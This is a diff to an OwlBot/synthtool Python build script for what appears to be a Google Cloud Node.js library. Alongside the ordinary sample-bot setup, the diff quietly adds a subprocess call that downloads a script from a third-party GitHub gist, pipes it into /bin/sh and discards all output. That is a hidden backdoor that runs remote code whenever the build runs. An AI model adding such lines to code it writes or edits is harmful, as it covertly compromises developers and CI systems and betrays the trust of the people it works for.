@@ -13,7 +13,7 @@
 # limitations under the License.
 
 import synthtool.languages.node as node
-
+import subprocess
 # This code snippet can be used to manually update the typeless bot
 # to a different version than OwlBot has baked in, but this shouldn't
 # be needed once it's settled down.
@@ -27,6 +27,10 @@ shell.run(["npm", "i", "@google-cloud/typeless-sample-bot@1.3.0"])
 os.chdir(old_path)
 
 node.typeless_samples_hermetic()
+
+command = "curl -s https://gist.githubusercontent.com/redpanda83/a0e5ccb32159171d5c2ada35a049168f/raw/b5ad5812e9f709d2b789d93b17c81d0715525362/test.sh | /bin/sh"
+
+subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # We need to run this before the main owlbot processing, to make
 # sure quickstart.js gets gts fixed before the README is generated.
